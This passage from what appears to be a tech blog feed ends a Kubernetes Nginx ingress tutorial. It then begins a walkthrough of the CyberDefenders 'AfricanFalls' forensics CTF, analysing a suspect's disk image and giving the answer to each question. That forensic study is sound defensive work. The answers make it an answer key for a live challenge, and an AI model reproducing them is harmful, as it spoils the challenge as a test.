class=\"line\">job.batch/ingress-nginx-admission-create created</span><br><span class=\"line\">job.batch/ingress-nginx-admission-patch created</span><br><span class=\"line\">ingressclass.networking.k8s.io/nginx created</span><br><span class=\"line\">validatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created</span><br></pre></td></tr></table></figure>\n<h2 id=\"check-the-nginx-ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#check-the-nginx-ingress-controller\">#</a> Check the Nginx Ingress Controller:</h2>\n<p>Let’s check the pods created in the namespace of the ingress-nginx</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get pods --namespace=ingress-nginx</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                        READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">ingress-nginx-admission-create-qd8fz        0/1     ContainerCreating   0          10s</span><br><span class=\"line\">ingress-nginx-admission-patch-76lgl         0/1     ContainerCreating   0          10s</span><br><span class=\"line\">ingress-nginx-controller-7575567f98-hg6tq   0/1     ContainerCreating   0          10s</span><br></pre></td></tr></table></figure>\n<p>After waiting a few minute until the controller is ready, we must check all the services and deployments of the ingress-nginx namespace again ! You must find an output similar to the following</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all -n ingress-nginx</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                            READY   STATUS      RESTARTS        AGE</span><br><span class=\"line\">pod/ingress-nginx-admission-create-9dshm        0/1     Completed   0               23m</span><br><span class=\"line\">pod/ingress-nginx-admission-patch-rj7gk         0/1     Completed   0               23m</span><br><span class=\"line\">pod/ingress-nginx-controller-7575567f98-8w6pm   1/1     Running     0               23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                         TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)                      AGE</span><br><span class=\"line\">service/ingress-nginx-controller             LoadBalancer   10.100.234.221   192.168.1.240   80:32545/TCP,443:31214/TCP   23m</span><br><span class=\"line\">service/ingress-nginx-controller-admission   ClusterIP      10.109.162.157   &lt;none&gt;          443/TCP                      23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                       READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/ingress-nginx-controller   1/1     1            1           23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                                  DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/ingress-nginx-controller-7575567f98   1         1         1       23m</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                       COMPLETIONS   DURATION   AGE</span><br><span class=\"line\">job.batch/ingress-nginx-admission-create   1/1           3s         23m</span><br><span class=\"line\">job.batch/ingress-nginx-admission-patch    1/1           4s         23m</span><br></pre></td></tr></table></figure>\n<p>Bingo! the ingress controller is ready and on running state! also is exposed with Load Balancer and it have a Extenal-IP  <code>192.168.1.240</code> <br>\nNow we can deploy an ingress object without any problem ! It’s time to deploy our 2 apps with ingress in one single domain name and one IP address !</p>\n<h1 id=\"deploy-the-two-apps-using-ingress\"><a class=\"markdownIt-Anchor\" href=\"#deploy-the-two-apps-using-ingress\">#</a> Deploy The two Apps using Ingress:</h1>\n<p>Let’s start by deploying the apps and expose it with Cluster IP service !</p>\n<figure class=\"highlight yaml\"><figcaption><span>Gym App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-gym</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gym-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-gym</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">gym-svc</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">ClusterIP</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the deployment and service of the gym app</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f gym-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-gym created</span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f gym-svc.yaml</span><br><span class=\"line\">service/gym-svc created</span><br></pre></td></tr></table></figure>\n<p>The manifest of the restaurant app and the service:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Restaurant App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-kitchen</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">kitchen-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">kitchen-svc</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">ClusterIP</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the restaurant deployment and the service:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen created</span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-svc.yaml</span><br><span class=\"line\">service/kitchen-svc created</span><br></pre></td></tr></table></figure>\n<p>Check the deployments and the services! :</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all</span><br><span class=\"line\">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">pod/4n6nk8s-gym-698f44db99-29dnr       1/1     Running   0          63s</span><br><span class=\"line\">pod/4n6nk8s-kitchen-6b56959b86-n7c9z   1/1     Running   0          46s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE</span><br><span class=\"line\">service/gym-svc             ClusterIP   10.110.191.206   &lt;none&gt;        80/TCP     53s</span><br><span class=\"line\">service/kitchen-svc         ClusterIP   10.102.94.94     &lt;none&gt;        80/TCP     39s</span><br><span class=\"line\">service/kubernetes          ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    3d14h</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                              READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/4n6nk8s-gym       1/1     1            1           63s</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen   1/1     1            1           46s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                         DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/4n6nk8s-gym-698f44db99       1         1         1       63s</span><br><span class=\"line\">replicaset.apps/4n6nk8s-kitchen-6b56959b86   1         1         1       46s</span><br></pre></td></tr></table></figure>\n<p>Let’s now create the ingress manifest:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Ingress YAML Definition</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">networking.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Ingress</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">annotations:</span></span><br><span class=\"line\">    <span class=\"attr\">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class=\"string\">/</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">ingress-4n6nk8s</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">ingressClassName:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\">  <span class=\"attr\">rules:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">host:</span> <span class=\"string\">justk8s.k8s</span></span><br><span class=\"line\">    <span class=\"attr\">http:</span></span><br><span class=\"line\">      <span class=\"attr\">paths:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">path:</span> <span class=\"string\">/kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">pathType:</span> <span class=\"string\">Prefix</span></span><br><span class=\"line\">        <span class=\"attr\">backend:</span></span><br><span class=\"line\">          <span class=\"attr\">service:</span></span><br><span class=\"line\">            <span class=\"attr\">name:</span> <span class=\"string\">kitchen-svc</span></span><br><span class=\"line\">            <span class=\"attr\">port:</span></span><br><span class=\"line\">              <span class=\"attr\">number:</span> <span class=\"number\">80</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">path:</span> <span class=\"string\">/gym</span></span><br><span class=\"line\">        <span class=\"attr\">pathType:</span> <span class=\"string\">Prefix</span></span><br><span class=\"line\">        <span class=\"attr\">backend:</span></span><br><span class=\"line\">          <span class=\"attr\">service:</span></span><br><span class=\"line\">            <span class=\"attr\">name:</span> <span class=\"string\">gym-svc</span></span><br><span class=\"line\">            <span class=\"attr\">port:</span></span><br><span class=\"line\">              <span class=\"attr\">number:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>The  <code>ingressClassName</code>  must be “nginx” since we have nginx ingress controller. The  <code>host</code>  field in the  <code>rules</code>  define the domain name of the request. So if a HTTP request come to the cluster with the host name  <code>justk8s.k8s</code>  this rull will be applied!<br>\nThe the  <code>path</code>  int the  <code>paths</code>  will be the route ! The ingress give you the service in this route!<br>\nIn our Example if we enter  <code>http://justk8s.k8s/kitchen</code>  the ingress will forward the restaurant app!<br>\nin the  <code>path</code>  field we specify the  <code>service</code>  name and the  <code>port number</code></p>\n<p>Now Let’s Create the ingress object</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f ingress.yaml</span><br><span class=\"line\">ingress.networking.k8s.io/ingress-4n6nk8s created</span><br></pre></td></tr></table></figure>\n<p>Check the ingerss object !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get ingress</span><br><span class=\"line\">NAME              CLASS   HOSTS         ADDRESS   PORTS   AGE</span><br><span class=\"line\">ingress-4n6nk8s   nginx   justk8s.k8s             80      5s</span><br></pre></td></tr></table></figure>\n<p>Display more details about the ingress object with  <code>kubectl describe ingress</code> :</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl describe ingress ingress-4n6nk8s</span><br><span class=\"line\">Name:             ingress-4n6nk8s</span><br><span class=\"line\">Labels:           &lt;none&gt;</span><br><span class=\"line\">Namespace:        default</span><br><span class=\"line\">Address:          192.168.1.240</span><br><span class=\"line\">Default backend:  default-http-backend:80 (&lt;error: endpoints <span class=\"string\">&quot;default-http-backend&quot;</span> not found&gt;)</span><br><span class=\"line\">Rules:</span><br><span class=\"line\">  Host         Path  Backends</span><br><span class=\"line\">  ----         ----  --------</span><br><span class=\"line\">  justk8s.k8s</span><br><span class=\"line\">               /kitchen   kitchen-svc:80 (10.1.235.141:80)</span><br><span class=\"line\">               /gym       gym-svc:80 (10.1.235.147:80)</span><br><span class=\"line\">Annotations:   nginx.ingress.kubernetes.io/rewrite-target: /</span><br><span class=\"line\">Events:</span><br><span class=\"line\">  Type    Reason  Age               From                      Message</span><br><span class=\"line\">  ----    ------  ----              ----                      -------</span><br><span class=\"line\">  Normal  Sync    7s (x2 over 19s)  nginx-ingress-controller  Scheduled <span class=\"keyword\">for</span> <span class=\"built_in\">sync</span></span><br></pre></td></tr></table></figure>\n<p>We see that the Default backend display  <code>(&lt;error: endpoints &quot;default-http-backend&quot; not found&gt;)</code> .<br>\nThis error occur because we don’t specify a default backend (route) so when you enter  <code>http://justk8s.k8s/</code>  we will find the nginx 404 not found page !</p>\n<h1 id=\"check-the-deployments\"><a class=\"markdownIt-Anchor\" href=\"#check-the-deployments\">#</a> Check the Deployments!</h1>\n<p>After Installing the LoadBalancer and Ingress Controller. Let’s try to access to our 2 apps. But before access to this apps let’s create an  <code>/etc/hosts</code>  entry ( <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code>  for Windows):</p>\n<figure class=\"highlight bash\"><figcaption><span>/etc/hosts</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.240 justk8s.k8s <span class=\"comment\"># The IP address of the Load Balancer of the Ingress Controller !</span></span><br></pre></td></tr></table></figure>\n<p>Now Let’s go to our browser! I add this entry in my master node! So I can access to these apps from my master node !:</p>\n<p><img data-src=\"https://imgur.com/p4sAzQX.png\" alt=\"\"><br>\n<img data-src=\"https://imgur.com/tauie6V.png\" alt=\"\"></p>\n<p>Bingo! Everything is Ok !</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/09/CyberDefenders/affrica-falls/",
            "url": "http://example.com/2022/09/09/CyberDefenders/affrica-falls/",
            "title": "CyberDefenders Writeup AfricanFalls",
            "date_published": "2022-09-08T23:20:27.000Z",
            "content_html": "<p>This CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc…<br>\nWe will investigate some useful informations! Be ready</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>John Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<blockquote>\n<p>1- What is the MD5 hash value of the suspect disk?</p>\n</blockquote>\n<p>Just inspec the  <code>ad1.txt</code>  and you’ll find useful information about the disk image like the acquisition time and the checksum</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> DiskDrigger.ad1.txt </span><br><span class=\"line\">Created By AccessData® FTK® Imager 4.5.0.3</span><br><span class=\"line\"></span><br><span class=\"line\">Case Information:</span><br><span class=\"line\">Acquired using: ADI4.5.0.3</span><br><span class=\"line\">...</span><br><span class=\"line\">[Computed Hashes]</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a</span><br><span class=\"line\"></span><br><span class=\"line\">Image information:</span><br><span class=\"line\"> Acquisition started:   Tue Jun 15 12:28:20 2021</span><br><span class=\"line\"> Acquisition finished:  Tue Jun 15 12:33:10 2021</span><br><span class=\"line\"> Segment list:</span><br><span class=\"line\">  D:\\Users\\Mawso3a\\Desktop\\DiskDrigger.ad1</span><br><span class=\"line\"></span><br><span class=\"line\">Image Verification Results:</span><br><span class=\"line\"> Verification started:  Tue Jun 15 12:33:18 2021</span><br><span class=\"line\"> Verification finished: Tue Jun 15 12:33:51 2021</span><br><span class=\"line\"> MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified</span><br><span class=\"line\"> SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 9471e69c95d8909ae60ddff30d50ffa1</p>\n</div>\n<blockquote>\n<p>2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)<br>\nWe found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite<br>\n<img data-src=\"https://imgur.com/YdY9w1L.png\" alt=\"\"><br>\nAfter Opening the database you can search about the history and find the correct answer using the right timestamp</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/jL9EEDB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  password cracking lists</p>\n</div>\n<blockquote>\n<p>3- What is the IPv4 address of the FTP server the suspect connected to?</p>\n</blockquote>\n<p>Wait man! FileZilla is installed in our system. I am sure that we will find the information in  <code>filezilla.xml</code></p>\n<p><img data-src=\"https://imgur.com/uOJpYIM.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  192.168.1.20</p>\n</div>\n<blockquote>\n<p>4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)</p>\n</blockquote>\n<p>This is EASY DUDE! just check the Recycle Bin ! You’ll find your target !<br>\n<img data-src=\"https://imgur.com/TuEyvM2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  2021-04-29 18:22:17 UTC</p>\n</div>\n<blockquote>\n<p>5- How many times was Tor Browser ran on the suspect’s computer? (number only)</p>\n</blockquote>\n<p>I guess this question is tricky! where is tor man !!! OK calm down you’ll find  <code>lnk</code>  file about tor but i think it’s fake one ! Let’s try an LNK Parser. I’ll use  <code>ericzimmerman</code>  tool !</p>\n<p><img data-src=\"https://imgur.com/GelvVNQ.png\" alt=\"\"></p>\n<p>Wow firefox.exe in TOR LNK file! This is Joke</p>\n<div class=\"note success\">\n<p>Answer:  0</p>\n</div>\n<blockquote>\n<p>6- What is the suspect’s email address?</p>\n</blockquote>\n<p>OK backing again to the browser history to check if the user visit a mailing website !<br>\n<img data-src=\"https://imgur.com/BmHa8m2.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   <span class=\"exturl\" data-url=\"bWFpbHRvOmRyZWFtbWFrZXI4MkBwcm90b25tYWlsLmNvbQ==\">dreammaker82@protonmail.com</span></p>\n</div>\n<blockquote>\n<p>7- What is the FQDN did the suspect port scan?</p>\n</blockquote>\n<p>He asked about port scan?? mmm I guess nmap is here ! Nmap are you here ?<br>\n<img data-src=\"https://imgur.com/UMN9Zbr.png\" alt=\"\" title=\"NMAP: YES I AM HERE !\"></p>\n<p>Just i checked the PowerShell history. You’ll find it in  <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine</code></p>\n<p><img data-src=\"https://imgur.com/OwOcsXB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  dfir.science</p>\n</div>\n<blockquote>\n<p>8- What country was picture “20210429_152043.jpg” allegedly taken in?</p>\n</blockquote>\n<p>I tried to inspect the metadata of the image and i found GPS position information!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 